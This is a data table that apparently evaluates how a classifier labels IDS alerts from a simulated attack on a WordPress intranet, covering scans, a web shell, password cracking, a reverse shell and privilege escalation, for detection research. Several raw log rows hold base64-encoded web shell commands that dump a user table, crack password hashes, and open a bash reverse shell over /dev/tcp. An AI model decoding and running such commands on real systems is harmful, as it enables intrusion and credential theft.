AT;#;Classification;Attack Line Content;Description;Correct Attack Type?
DNSteal;6;"Command and Control,
Data Exfiltration";"IDS: “High entropy in DNS domain.”, “Value entropy anomaly detected”,
Raw Data: “dnsmasq[14460]: query[A] youtu.be from [IP]”";Classification probably based on tool name dnsmasq and high entropy in DNS domain;Correct & expressive
DNSteal;1;"Reconnaissance,
Network Scanning";"IDS: “Unusual occurrence frequencies of query records in DNS logs.”, “Frequency anomaly detected”,
Raw Data: “dnsmasq[14522]: query[A] mail.price.fox.org [IP]”";Classification probably based on high frequency of DNS A queries;Incorrect
Service Scans;3;"Brute Force,
Account Access";"IDS: “New event type.”, “New path(es) detected”,
Raw Data: “taylorcruz-mail dovecot: imap-login: Disconnected (no auth attempts in 0 secs): user=<>, rip=192.168.130.77”";Classification probably based on unsuccessful imap login without auth atempts;Alternate explanation for alert
Service Scans;4;Reconnaissance;"IDS: “New event type.”, “New path(es) detected”,
Raw Data: “no host name found for IP address [IP]”";Classification probably based on repeated unsuccessful hostname resolving for same IP;Too generic
Service Scans;2;"Web Attack,
Exploitation Attempt";"IDS: “New event type”, “New path(es) detected”,
Raw Data: “AH01630: client denied by server configuration: /var/www/html/”";Classification probably based on attempted access to web base directory;Too generic
Service Scans;1;"Network Evasion,
Exploitation Attempt";"IDS: “New event type”, “New path(es) detected”,
Raw Data: “TLS error on connection from [192.168.130.77] (gnutls_handshake): An unexpected TLS packet was received.”";Classification probably based on protocol name TLS and unexpected TLS packet;Too generic
Service Scans;4;"Reconnaissance,
Vulnerability Scanning";"IDS: “New status code in Apache Access log.”, “New value(s) detected”,
Raw Data: “GET /nmaplowercheck1642508249 HTTP/1.1 403 363 - Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)”";Classification probably based on tool name nmap and 403 error;Correct & expressive
Service Scans;1;"Reconnaissance, 
Access Attempt";"IDS: “New status code in Apache Access log.”, “New value(s) detected”, 
Raw Data: “GET / HTTP/1.0 403 363 - - ”";Classification probably based on http status code 403;Too generic
Service Scans;5;"Reconnaissance,
Web Attack";"IDS: “New event type”, “New path(es) detected”,
Raw Data: “AH01630: client denied by server configuration: /var/www/html/HNAP1\”";Classification probably based on  repeated unsuccessful access to web root directory;Too generic
WPScan;1;"Reconnaissance,
Vulnerability Scanning";"IDS: “New status code in Apache Access log.”, “New value(s) detected”,
Raw Data: “GET /wp-content/plugins/akismet/ HTTP/1.1 403 3362 https://intranet.price.fox.org WPScan v3.8.20 (https://wpscan.com/wordpress-security-scanner)”";Classification probably based on tool name WPScan and http status code 403;Correct & expressive
WPScan;14;"Reconnaissance,
Vulnerability Scanning";"IDS: “New request method in Apache Access log.”, “New value(s) detected”,
Raw Data:  “HEAD /wntent/plu/analytics-for-wp/ HTTP/1.1 404 146 https://intranet.price.fox.org WPScan v3.8.20 (https://wpscan.com/wordpress-security-scanner)”";Classification probably based on tool name WPScan and http status code 404;Correct & expressive
Dirb;2;"Reconnaissance, 
Credential Access";"IDS: “New status code in Apache Access log.”, “New value(s) detected”,
Raw Data: “GET /javascript/jquery/.htpasswd HTTP/1.1 403 366 – Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)”";Classification probably based on attempted access to sensitive file and http status code 403;Alternate explanation for alert
Dirb;16;"Reconnaissance, 
Discovery";"IDS: “New characters in Apache Access request.”, “New character(s) detected”
Raw Data: “GET /javascript/jquery/@ HTTP/1.1 404 363 – Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)”";Classification probably based on special characters in request;Too generic
Dirb;4;"Reconnaissance, 
Vulnerability Scanning";"IDS: “New event type.”, “New path(es) detected”,
Raw Data: “script '/var/www/intranet.price.fox.org/wp-includes/sitemaps/info.php' not found or unable to stat”";Classification probably based on attempted access to php config file in WordPress folder;Correct & expressive
Dirb;6;"Reconnaissance, 
Information Disclosure Attempt";"IDS: “New event type”, “New path(es) detected”, 
Raw Data: “script '/var/www/intranet.price.fox.org/wp-includes/sitemaps/phpinfo.php' not found or unable to stat”";Classification probably based on attempted access to php config file in WordPress folder;Alternate explanation for alert
Dirb;1;"Reconnaissance,
Information Gathering";"IDS: “New event type.”, “New path(es) detected”
Raw Data: “AH01276: Cannot serve directory /var/www/intranet.price.fox.org/wp-includes/js/thickbox/: No matching DirectoryIndex (index.html,index.cgi,index.pl,index.php,index.xhtml,index.htm) found, and server-generated directory index forbidden by Options directive”";Classification probably based on attempted access to WordPress folder without valid DirectoryIndex;Too generic
Dirb;5;"Reconnaissance,
Credential Access";"IDS: “New event type.”, “New path(es) detected”,
Raw Data: “AH01630: client denied by server configuration: /var/www/intranet.price.fox.org/wp-includes/js/thickbox/.hta”";Classification probably based on attempted access to hidden file in WordPress folder;Alternate explanation for alert
Dirb;4;"Reconnaissance, 
Directory Traversal";"IDS: “New status code in Apache Access log.”, “New value(s) detected”,
Raw Data: “GET /wp-includes/js/tinymce/langs HTTP/1.1 301 515 - Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)”";Classification probably based on http status code 301;Correct & expressive
Dirb;2;"Reconnaissance, 
Directory Traversal";"IDS: “New status code in Apache Access log.”, “New value(s) detected”,
Raw Data: “GET /wp-includes/js/tinymce/plugins/hr/ HTTP/1.1 403 366 - Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)”";"Classification probably based on attempted access to WordPress plugin folder, HTTP code is different than above, except for that they are the same; which indicated that the http code might not be that important for the classifcation";Correct & expressive
Dirb;3;"Reconnaissance,
Credential Access";"IDS: “New status code in Apache Access log.”, “New value(s) detected”,
Raw Data: “GET /wp-content/themes/go/dist/images/social/.hta HTTP/1.1 403 366 - Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)”";Classification probably based on attempted access to hidden file in WordPress folder and http status code 403;Alternate explanation for alert
Web Shell;2;"Web Shell, 
Command and Control, 
Exfiltration";"IDS: “High entropy in Apache Access request.”, “Value entropy anomaly detected”,
Raw Data: “/wp-content/uploads/2022/01/yqagisjaqe-1642509481.8663.php?wp_meta=WyJteXNxbCIsICItdSIsICJ3b3JkcHJlc3MiLCAiLXB0YWlub294M2FlZGVlU2giLCAid29yZHByZXNzX2RiIiwgIi1lIiwgIlwic2VsZWN0ICogZnJvbSB3cF91c2Vyc1wiIl0%3D”";Classification probably based on high entropy because of base64 encoded payload and mysql query / github download in decoded payload;Correct & expressive
Password cracking;1;"Web Shell, 
Credential Access, 
Defense Evasion";"IDS: “High entropy in Apache Access request.”, “Value entropy anomaly detected”,
Raw Data: “GET /wp-content/uploads/2022/01/yqagisjaqe-1642509481.8663.php?wp_meta=WyIuL3dwaGFzaGNyYWNrLTAuMS93cGhhc2hjcmFjay5zaCIsICItdyIsICIkUFdEL3JvY2t5b3UudHh0IiwgIi1qIiwgIi4vd3BoYXNoY3JhY2stMC4xL2pvaG4tMS43LjYtanVtYm8tMTItTGludXg2NC9ydW4iLCAiLXUiLCAicGhvcGtpbnMiXQ%3D%3D HTTP/1.1\\\"" 200 506876 \\\""-\\\"" \\\""python-requests/2.27.1”";"Classification probably based on high entropy because of base64 encoded payload and wphashcrack and rockyou.txt in decoded payload; could be more focused on password cracking ";Correct & expressive
Password cracking;1;"Reconnaissance, 
Discovery";"IDS: “Unusual occurrence frequencies of Apache Access request methods.”, “Frequency anomaly detected”,
Raw Data: “POST /services/ajax.php/imp/poll HTTP/1.1 200 463 https://mailserver.taylorcruz.fox.org/imp/dynamic.php?page=mailbox Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/95.0.4638.69 Safari/537.36”";Classification probably based on high frequency of apache access requests, representing potential scanning;Alternate explanation for alert
Password cracking;1;"Resource Hijacking, 
Denial of Service";IDS: “CPU value deviates from average in monitoring logs.”, “Statistical data report”,;Classification probably based on significant increase in CPU usage;Alternate explanation for alert
Password cracking;1;"Reconnaissance,  
Command and Control";"IDS: “Unusual occurrence frequencies of DNS query Ips.”, “Frequency anomaly detected”,
Raw Data: “dnsmasq[14460]: query[A] mmx-ds.cdn.whatsapp.net from [IP]”";Classification probably based on high frequencies of DNS query Ips;Alternate explanation for alert
Password cracking;1;"Reconnaissance,
Vulnerability Scanning";"IDS: “Unusual occurrence frequencies of Apache Access request methods.”, “Frequency anomaly detected”
Raw Data: “GET / HTTP/1.1 200 6128 - Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:86.0) Gecko/20100101 Firefox/86.0”";Classification probably based on high occurrence frequency of Apache Access requests, however the requests are successful;Incorrect
Reverse Shell;1;"Web Shell, 
Command and Control, 
Defense Evasion";"IDS: “High entropy in Apache Access request.”, “Value entropy anomaly detected”, 
Raw Data: “/wp-content/uploads/2022/01/yqagisjaqe-1642509481.8663.php?wp_meta=WyJiYXNoIiwgIi1jIiwgIiAnMDwmMTk2O2V4ZWMgMTk2PD4vZGV2L3RjcC8xOTIuMTY4LjEzMC43Ny81MTg5ODsgc2ggPCYxOTYgPiYxOTYgMj4mMTk2JyIsICImIl0%3D”";Classification probably based on high entropy because of base64 encoded payload and decoded payload containing bash script executing sh command to create a reverse shell;Correct & expressive
Privilege Escalation;1;Privilege Escalation;"IDS: “New event type.”, “New path(es) detected”,
Raw Data: “intranet-server su[28816]: Successful su for phopkins by www-data”";Classification probably based on tool name su;Correct & expressive
Privilege Escalation;1;Privilege Escalation;"IDS: “New event type.”, “New path(es) detected”,
Raw Data: “intranet-server su[28816]: + /dev/pts/1 www-data:phopkins”";Classification probably based on tool name su;Correct & expressive
Privilege Escalation;1;Privilege Escalation;"IDS: “New event type.”, “New path(es) detected”,
Raw Data: “intranet-server su[28816]: pam_unix(su:session): session opened for user phopkins by (uid=33)”";Classification probably based on tool name su;Correct & expressive
Privilege Escalation ;1;"Privilege Escalation,
Defense Evasion";"IDS: “New user_auth parameter combination in Audit logs.”, “New value combination(s) detected”,
Raw Data: “type=USER_AUTH msg=audit(1642511671.635:2441): pid=28816 uid=33 auid=4294967295 ses=4294967295 msg='op=PAM:authentication acct=phopkins exe=/bin/su hostname=? addr=? terminal=/dev/pts/1 res=success”";Classification probably based on tool name su;Correct & expressive
Privilege Escalation ;1;"Privilege Escalation,
Defense Evasion";"IDS: “New user_acct parameter combination in Audit logs.”, “New value combination(s) detected”,
Raw Data: “type=USER_AUTH msg=audit(1642511671.635:2441): pid=28816 uid=33 auid=4294967295 ses=4294967295 msg='op=PAM:authentication acct=phopkins exe=/bin/su hostname=? addr=? terminal=/dev/pts/1 res=success”";Classification probably based on tool name su;Correct & expressive
Privilege Escalation ;1;"Privilege Escalation,
Defense Evasion";"IDS: “New cred_acq parameter combination in Audit logs.”, “New value combination(s) detected”,
Raw Data: “type=USER_AUTH msg=audit(1642511671.635:2441): pid=28816 uid=33 auid=4294967295 ses=4294967295 msg='op=PAM:authentication acct=phopkins exe=/bin/su hostname=? addr=? terminal=/dev/pts/1 res=success”";Classification probably based on tool name su;Correct & expressive
Privilege Escalation ;1;"Privilege Escalation,
Defense Evasion";"IDS: “New user_start parameter combination in Audit logs.”, “New value combination(s) detected”,
Raw Data: “type=USER_AUTH msg=audit(1642511671.635:2441): pid=28816 uid=33 auid=4294967295 ses=4294967295 msg='op=PAM:authentication acct=phopkins exe=/bin/su hostname=? addr=? terminal=/dev/pts/1 res=success”";Classification probably based on tool name su;Correct & expressive
;100;;;;
